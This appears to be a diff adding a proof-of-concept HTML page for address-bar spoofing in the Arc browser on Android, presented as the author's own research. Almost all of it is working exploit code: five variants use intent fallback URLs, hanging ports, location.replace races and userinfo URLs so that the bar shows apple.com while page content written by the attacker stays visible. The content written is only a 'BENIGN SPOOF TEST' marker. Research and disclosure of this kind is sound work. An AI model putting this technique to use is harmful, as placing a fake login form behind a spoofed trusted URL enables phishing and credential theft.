@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Apple</title>
+<style>
+ body{max-width:720px;margin:20px auto;padding:0 16px;font:15px/1.5 system-ui,sans-serif}
+ button{padding:12px 16px;font:inherit;font-weight:650;width:100%;margin:5px 0}
+ input{width:100%;padding:9px;font:inherit;border:1px solid #ccc;border-radius:6px;margin:4px 0}
+ pre{min-height:8em;padding:10px;white-space:pre-wrap;overflow-wrap:anywhere;background:#f3f4f6;font-size:12px}
+ .warn{color:#b23;font-size:12px}
+</style>
+</head>
+<body>
+<main id="main">
+<h1>Arc Android — address-bar spoof variants (benign)</h1>
+<p class="warn">Benign: content marker only ("BENIGN SPOOF TEST"), no defacement. Proof = omnibox shows target while this attacker content stays. Own research, Arc Android.</p>
+
+<p>target to display in the bar</p><input id="target" value="https://apple.com">
+<p>hanging port</p><input id="port" value="88">
+<p>no-app intent scheme (triggers fallback)</p><input id="scheme" value="zxqnoapphandler">
+<p>hang host for userinfo variant (D)</p><input id="hanghost" value="example.com">
+
+<button id="a" type="button">A · intent-fallback → replace(target:port)  [original]</button>
+<button id="b" type="button">B · fallback_url = target:port directly (single-step)</button>
+<button id="c" type="button">C · continuous race to target:port/?r=N</button>
+<button id="d" type="button">D · userinfo: https://target@hanghost:port</button>
+<button id="e" type="button">E · intent-fallback → replace(target/generate_204)</button>
+<pre id="log"></pre>
+</main>
+
+<script>
+(() => {
+'use strict';
+const out=document.getElementById('log');
+function log(m){ out.textContent = m+'\n'+out.textContent; }
+function V(id,d){ const x=document.getElementById(id); return (x&&x.value||d).trim(); }
+function target(){ return V('target','https://apple.com'); }
+function host(){ return target().replace(/^https?:\/\//,'').replace(/\/.*$/,''); }
+function port(){ return V('port','88'); }
+function scheme(){ return V('scheme','zxqnoapphandler'); }
+function intent(fb){ return 'intent://x/#Intent;scheme='+scheme()+';S.browser_fallback_url='+encodeURIComponent(fb)+';end'; }
+function mark(t){ try{ document.open(); document.write('<meta name=viewport content="width=device-width,initial-scale=1"><body style="font-family:system-ui;padding:24px"><h1 style="color:#c00">BENI
+GN SPOOF TEST</h1><p>variant '+t+' — if the bar shows '+host()+' above, this is a spoof. origin='+location.origin+'</p>'); document.close(); }catch(e){ log('write err '+e); } }
+function hang(){ return 'https://'+host()+':'+port()+'/'; }
+
+document.getElementById('a').addEventListener('click', () => {
+  log('A: intent-fallback(csi) then replace('+hang()+')');
+  location.href = intent('https://www.google.com/csi');
+  mark('A'); setTimeout(()=>{ try{ location.replace(hang()); }catch(e){log('err '+e);} }, 1000);
+});
+
+document.getElementById('b').addEventListener('click', () => {
+  log('B: intent fallback_url = '+hang()+' (single-step)');
+  mark('B'); location.href = intent(hang());
+});
+
+document.getElementById('c').addEventListener('click', () => {
+  log('C: intent then CONTINUOUS race to '+hang()+'?r=N');
+  location.href = intent('https://www.google.com/csi'); mark('C');
+  var n=0; var iv=setInterval(()=>{ try{ location.replace(hang()+'?r='+(++n)); }catch(e){} }, 60);
+  setTimeout(()=>{ clearInterval(iv); log('C race stopped (15s)'); }, 15000);
+});
+
+document.getElementById('d').addEventListener('click', () => {
+  const u='https://'+host()+'@'+V('hanghost','example.com')+':'+port()+'/';
+  log('D: userinfo '+u);
+  mark('D'); setTimeout(()=>{ try{ location.replace(u); }catch(e){log('err '+e);} }, 300);
+});
+
+document.getElementById('e').addEventListener('click', () => {
+  log('E: intent-fallback then replace(target/generate_204)');
+  location.href = intent('https://www.google.com/csi'); mark('E');
+  setTimeout(()=>{ try{ location.replace(target().replace(/\/$/,'')+'/generate_204'); }catch(e){log('err '+e);} }, 1000);
+});
+
+log('ready — Arc Android. Try A..E; watch the omnibox vs the BENIGN SPOOF content.');
+})();
+</script>
+</body>
+</html>
